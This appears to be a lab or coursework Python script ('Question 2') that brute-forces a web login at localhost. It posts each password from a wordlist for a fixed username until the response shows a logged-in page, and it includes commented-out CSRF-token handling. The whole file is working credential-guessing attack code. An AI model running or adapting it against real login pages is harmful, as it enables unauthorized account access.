import os 
from requests import Request, Session
import requests
from bs4 import BeautifulSoup
import time

cwd = os.getcwd()
sep = os.sep

################
## Question 2 ##
################
url = "http://localhost"

form_data = {
    "username": "V_Nehemiah0",
    "password": "",
    "submit": "submit",
}

webSession = Session()

# get_response = webSession.get(url) #gets the CSRF cookie for this session, since this is the inital connection for this session

# #Get this csrf token
# soup = BeautifulSoup(get_response.text, "html.parser")
# csrf_token = soup.find("input", attrs={'name':"csrf_token"})["value"]

# #Save the CSRF token for all future form posts
# form_data["csrf_token"] = csrf_token

i = 0
with open(f"{cwd}{sep}Resources{sep}passwords.txt") as pwFile:
    for line in pwFile:
        form_data["password"] = line.strip()

        response = webSession.post(url, form_data)

        print(i)
        i += 1
        if "logOut" in response.text:
            print(f"The password is {line}")
            break




# https://stackoverflow.com/questions/51351443/get-csrf-token-using-python-requests